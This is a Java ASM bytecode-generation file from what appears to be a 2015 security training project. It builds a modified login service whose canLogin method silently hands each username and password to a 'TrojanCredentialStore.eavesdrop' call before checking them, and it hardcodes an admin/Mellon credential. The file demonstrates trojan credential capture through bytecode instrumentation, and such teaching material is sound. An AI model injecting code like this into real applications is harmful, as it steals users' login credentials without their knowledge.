/* _____________________________________________________________________________
 *
 * Project   : QAcampus - Engineering Camp 2015
 * Copyright : (c) 2015 QAware GmbH
 * License   : MIT (http://opensource.org/licenses/MIT)
 * Designed and handcrafted in Germany
 * _____________________________________________________________________________
 */
package asm.de.qaware.campus.secpro.agent.impl;

import org.objectweb.asm.*;

/**
 * This class is the ASM dump of the modified EavesdropLoginServiceImpl.
 * <p>
 * Use gradlew asmifyModified
 */
public class EavesdropAdminServiceImplDump implements Opcodes {

    public static byte[] dump() throws Exception {

        ClassWriter cw = new ClassWriter(0);
        FieldVisitor fv;
        MethodVisitor mv;
        AnnotationVisitor av0;

        cw.visit(V1_7, ACC_PUBLIC + ACC_SUPER, "de/qaware/campus/secpro/agent/impl/EavesdropLoginServiceImpl", null, "java/lang/Object", new String[]{"de/qaware/campus/secpro/agent/LoginService"});

        // this here is the static LOGINS map
        {
            fv = cw.visitField(ACC_PRIVATE + ACC_FINAL + ACC_STATIC, "LOGINS", "Ljava/util/Map;", "Ljava/util/Map<Ljava/lang/String;Ljava/lang/String;>;", null);
            fv.visitEnd();
        }
        // this here is the default constructor
        {
            mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
            mv.visitCode();
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
            mv.visitInsn(RETURN);
            mv.visitMaxs(1, 1);
            mv.visitEnd();
        }
        // this here is the modified canLogin method
        {
            mv = cw.visitMethod(ACC_PUBLIC, "canLogin", "(Ljava/lang/String;Ljava/lang/String;)Z", null, null);
            mv.visitCode();

            // this here will place the method params on the call stack and
            // invoke the static eavesdrop method
            mv.visitVarInsn(ALOAD, 1);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitMethodInsn(INVOKESTATIC, "de/qaware/campus/secpro/part03/TrojanCredentialStore", "eavesdrop", "(Ljava/lang/String;Ljava/lang/String;)V", false);

            // continue as usual
            mv.visitFieldInsn(GETSTATIC, "de/qaware/campus/secpro/agent/impl/EavesdropLoginServiceImpl", "LOGINS", "Ljava/util/Map;");
            mv.visitVarInsn(ALOAD, 1);
            mv.visitMethodInsn(INVOKEINTERFACE, "java/util/Map", "get", "(Ljava/lang/Object;)Ljava/lang/Object;", true);
            mv.visitTypeInsn(CHECKCAST, "java/lang/String");
            mv.visitVarInsn(ASTORE, 3);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitMethodInsn(INVOKESTATIC, "java/util/Objects", "equals", "(Ljava/lang/Object;Ljava/lang/Object;)Z", false);
            mv.visitInsn(IRETURN);
            mv.visitMaxs(2, 4);
            mv.visitEnd();
        }
        // this here is the static initializer
        {
            mv = cw.visitMethod(ACC_STATIC, "<clinit>", "()V", null, null);
            mv.visitCode();
            mv.visitMethodInsn(INVOKESTATIC, "com/google/common/collect/Maps", "newHashMap",
                    "()Ljava/util/HashMap;", false);
            mv.visitFieldInsn(PUTSTATIC, "de/qaware/campus/secpro/agent/impl/EavesdropLoginServiceImpl", "LOGINS", "Ljava/util/Map;");
            mv.visitFieldInsn(GETSTATIC, "de/qaware/campus/secpro/agent/impl/EavesdropLoginServiceImpl", "LOGINS", "Ljava/util/Map;");
            mv.visitLdcInsn("admin");
            mv.visitLdcInsn("Mellon");
            mv.visitMethodInsn(INVOKEINTERFACE, "java/util/Map", "put", "(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;", true);
            mv.visitInsn(POP);
            mv.visitInsn(RETURN);
            mv.visitMaxs(3, 0);
            mv.visitEnd();
        }
        cw.visitEnd();

        return cw.toByteArray();
    }
}